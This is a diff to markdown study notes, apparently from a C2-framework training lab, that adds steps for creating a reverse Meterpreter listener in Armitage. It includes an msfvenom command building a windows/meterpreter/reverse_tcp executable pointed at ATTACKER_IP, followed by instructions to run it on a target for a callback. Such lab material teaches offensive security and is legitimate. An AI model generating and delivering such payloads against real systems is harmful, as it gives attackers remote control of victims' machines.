@@ -342,9 +342,32 @@ ssh -L 55553:127.0.0.1:55553 root@192.168.0.44
 - Next, we're going to move onto a topic that all C2 servers have - this being listener creation. 
 - To stay on topic, we will demonstrate how to set up a basic listener with Armitage then explore some of the other theoretical listeners you may encounter in various other C2 Frameworks. 
 - Let's create a basic Meterpreter Listener running on TCP/31337. To start, click on the Armitage dropdown and go over to the "Listeners" section; you should see three options, Bind, Reverse, and set LHOST. 
-- Bind refers to Bind Shells; you must connect to these hosts. Reverse refers to standard Reverse Shells; this is the option we will be using.
+- Bind refers to Bind Shells; you must connect to these hosts. 
+- Reverse refers to standard Reverse Shells; this is the option we will be using.
   > ![image](https://user-images.githubusercontent.com/51442719/180646140-40ae4b3d-20ce-4ad1-baf8-843c5524fa9f.png) 
   > - *Creating a Listener in Armitage*
+- After clicking "Reverse," a new menu will open up, prompting you to configure some basic details about the listener, specifically what port you want to listen on and what listener type you would like to select. 
+- There are two options you can choose from, "Shell" or "Meterpreter". 
+- Shell refers to a standard netcat-style reverse shell, and Meterpreter is the standard Meterpreter reverse shell.
+  > ![image](https://user-images.githubusercontent.com/51442719/180646172-865bbb36-c7db-47a4-ac51-3d67cb125839.png)
+  > - *Configuring the Listener*
+- After pressing enter, a new pane will open up, confirming that your listener has been created. 
+- This should look like the standard Metasploit exploit/multi/handler module.
+  > ![image](https://user-images.githubusercontent.com/51442719/180646181-6cbe2640-e5bf-48e9-bfb6-91e81a77ca5b.png)
+  > - *Listener successfully configured*
+- After setting up a listener, you can generate a standard windows/meterpreter/reverse_tcp reverse shell using MSFvenom and set the LHOST to the Armitage server to receive callbacks to our Armitage server. 
+
+#### Getting a Callback
+```cmd
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe -o shell.exe
+```
+- After generating the windows/meterpreter/reverse_tcp using MSFVenom, we can transfer the payload to a target machine and execute it. 
+- After a moment or two, you should receive a callback from the machine.
+  > ![image](https://user-images.githubusercontent.com/51442719/180646213-7d8d87e5-81e5-46b0-b7cc-a57216c1302e.png)
+  > - *Callback from the Victim*
+
+
+
 
 ---
 
